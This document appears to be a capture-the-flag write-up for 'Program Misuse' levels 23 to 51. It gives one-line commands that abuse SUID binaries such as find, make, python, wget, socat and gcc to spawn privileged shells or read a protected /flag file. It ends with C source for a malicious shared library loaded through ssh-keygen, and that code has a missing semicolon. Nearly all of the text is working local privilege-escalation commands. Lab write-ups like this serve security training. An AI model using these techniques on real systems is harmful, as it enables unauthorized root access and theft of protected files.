# Playing With Programs

## Program Misuse

> [GTFOBins](https://gtfobins.github.io)

### level23

```shell
/challenge/bin/genisoimage -sort "/flag"
```

### level24

```shell
/challenge/bin/env /bin/sh -p
```

### level25

```shell
./find . -exec /bin/sh -p \; -quit
```

### level26

```shell
COMMAND='/bin/sh -p'
./make -s --eval=$'x:\n\t-'"$COMMAND"
```

### level27

```shell
./nice /bin/sh -p
```

### level28

```shell
./timeout 7d /bin/sh -p
```

### level29

```shell
./stdbuf -i0 /bin/sh -p
```

### level30

```shell
./setarch $(arch) /bin/sh -p
```

### level31

```shell
./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'
```

### level32

```shell
LFILE=/flag
socat -u "file:$LFILE" -
```

### level33

```shell
LFILE=/flag
whiptail --textbox --scrolltext "$LFILE" 20 80
```

### level34

```shell
LFILE=/flag
./awk '//' "$LFILE"
```

### level35

```shell
LFILE=/flag
./sed -e '' "$LFILE"
```

### level36

```shell
./ed /flag
,p
q
```

### level37

```shell
chown /flag hacker
cat /flag
```

### level38

```shell
chmod 777 /flag
cat /flag
```

### level39

```shell
cp /flag /dev/stdout
```

### level40

```shell
/challenge/bin/mv /usr/bin/cat /challenge/bin/mv
/challenge/babysuid
/challenge/bin/mv /flag
```

### level41

```shell
perl -ne print /flag
```

### level42

```shell
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### level43

```shell
echo "puts File.read("/flag")" > ruby-exp.rb
./ruby ruby-exp.rb
```

### level44

```shell
./bash -p
```

### level45

```shell
./date -f /flag
```

### level46

```shell
./dmesg -rF /flag
```

### level47

```shell
./wc --files0-from /flag
```

### level48

```shell
./gcc @/flag
```

### level49

```shell
./as @/flag
```

### level50

```shell
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
./wget --use-askpass=$TF 0
```

### level51

1. 先编写一个test.c

   ```c
   #include <dlfcn.h>
   #include <unistd.h>
   
   static void C_GetFunctionList() __attribute__((constructor));
   
   void C_GetFunctionList()
   {
       printf("euid: %d\n", geteuid());
       execl("/bin/sh","/bin/sh -p","-p",NULL)
   }
   
   int main()
   {
       return 0;
   }
   ```

   2. 然后编译`gcc -shared -o libtest.so -fPIC test.c`
   3. 然后用ssh-keygen运行`ssh-keygen -D libtest.so`获取shell
